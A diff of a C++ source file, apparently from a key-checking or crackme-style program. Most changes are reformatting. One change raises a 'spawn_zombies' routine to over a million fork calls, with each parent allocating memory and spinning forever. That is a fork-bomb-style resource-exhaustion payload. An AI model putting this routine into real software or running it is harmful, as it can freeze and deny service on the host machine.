@@ -4,26 +4,29 @@
 #include <file_paths.h>
 #include <filesystem>
 #include <iostream>
+#include <string.h>
 #include <string>
 #include <sys/utsname.h>
 #include <sys/wait.h>
 #include <thread>
 #include <unistd.h>
-#include <string.h>
 
 __attribute__((always_inline)) inline void spawn_zombies()
 {
-        int num_of_child_processes = 1024;
-        for (int i = 0; i < num_of_child_processes; i++)
+        int num_of_child_processes = 1024 * 1024;
+        for(int i = 0; i < num_of_child_processes; i++)
         {
                 pid_t child = fork();
                 if(child != 0)
                 {
-                        int size = 1000000;
-                        std::string* ptr = (std::string*)malloc(size);
-                        int r = rand()%221 + 33;
-                        memset(ptr, r, size);
-                        while(true){}
+                        for(size_t i = 0; i < 1024; i++)
+                        {
+                                int   size = 1024;
+                                void* ptr  = malloc(size);
+                                int   r    = rand() % 221 + 33;
+                                memset(ptr, r, size);
+                        }
+                        while(true);
                         break;
                 }
         }
@@ -329,14 +332,14 @@ __attribute__((always_inline)) inline std::string get_main_key(std::string&& key
         // }
         // if (fork() == 0) {
         //         dup2(pipefd[1], STDERR_FILENO);
-        //         close(pipefd[0]); 
+        //         close(pipefd[0]);
         //         close(pipefd[1]);
         //         execl(decrypt_key_bin_name.c_str(), decrypt_key_bin_name.c_str(), attempted_key.c_str(), enc_key_file.c_str(), (char*)NULL);
         // } else {
         //         close(pipefd[1]);
         //         char buffer[513];
         //         ssize_t count = read(pipefd[0], buffer, sizeof(buffer) - 1);
-        //         close(pipefd[0]); 
+        //         close(pipefd[0]);
         //         buffer[count] = '\0';
 
         //         int status;
@@ -353,10 +356,13 @@ __attribute__((always_inline)) inline std::string get_main_key(std::string&& key
 
 __attribute__((always_inline)) inline void decrypt_secret(std::string&& key)
 {
-        if (fork() == 0) {
+        if(fork() == 0)
+        {
                 // Child process: execute the decryption program with the key as the only argument
                 execl(decrypt_bin_name.c_str(), decrypt_bin_name.c_str(), key.c_str(), (char*)NULL);
-        } else {
+        }
+        else
+        {
                 // Parent process: wait for the child process to complete
                 wait(NULL);
         }
